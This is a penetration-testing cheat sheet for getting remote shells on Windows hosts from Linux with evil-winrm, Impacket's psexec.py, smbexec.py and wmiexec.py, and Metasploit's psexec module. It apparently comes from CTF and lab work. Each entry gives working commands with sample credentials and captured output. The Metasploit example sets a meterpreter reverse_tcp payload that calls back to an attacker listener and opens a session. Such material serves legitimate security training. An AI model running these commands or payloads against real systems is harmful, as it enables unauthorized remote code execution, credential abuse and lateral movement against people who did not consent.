# Windows Remote Access
## Windows shell from Linux
### evil-winrm
evil-winrm
```
evil-winrm -i example.htb -u ryan -p Password123
```
Example output:
```
$ evil-winrm -i example.htb -u ryan -p Password123
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ryan\Documents>
```
Example 2 (using IP address):
```
$ evil-winrm -i 10.129.241.38 -u emily -p Password123
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily\Documents> cd ..
```
### psexec.py
psexec.py
```
psexec.py MARVEL.local/administrator@example.htb
```
Example output:
```
$ psexec.py MARVEL.local/administrator@example.htb
Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Requesting shares on example.htb.....
[*] Found writable share ADMIN$
[*] Uploading file CPSFzOAa.exe
[*] Opening SVCManager on example.htb.....
[*] Creating service mFYM on example.htb.....
[*] Starting service mFYM.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
```

### msf psexec
Metasploit psexec (windows/smb/psexec)
```
use exploit/windows/smb/psexec
```
Example output:
```
msf6 exploit(windows/smb/psexec) > set payload payload/windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                example.local    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass               Password123      no        The password for the specified username
   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBUser               Administrator    no        The username to authenticate as


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.22.2       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   PowerShell


msf6 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 10.10.22.2:4444 
[*] 10.4.27.211:445 - Connecting to the server...
[*] 10.4.27.211:445 - Authenticating to 10.4.27.211:445 as user 'Administrator'...
[*] 10.4.27.211:445 - Executing the payload...
[+] 10.4.27.211:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (200262 bytes) to 10.4.27.211
[*] Meterpreter session 6 opened (10.10.22.2:4444 -> 10.4.27.211:49790 ) at 2023-08-28 04:49:53 +0530

meterpreter >
```
### smbexec.py
smbexec.py
```
smbexec.py Administrator:'Password123'@example.local
```
Example output:
```
root@attackdefense:~# smbexec.py Administrator:'Password123'@example.local
Impacket v0.9.25.dev1+20220131.200424.badf09d - Copyright 2021 SecureAuth Corporation

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>
```
### wmiexec.py
```
wmiexec.py example.htb/administrator:Password123@10.129.237.154
```
Example output:
```
$ wmiexec.py example.htb/administrator:Password123@10.129.237.154
Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv2.1 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```
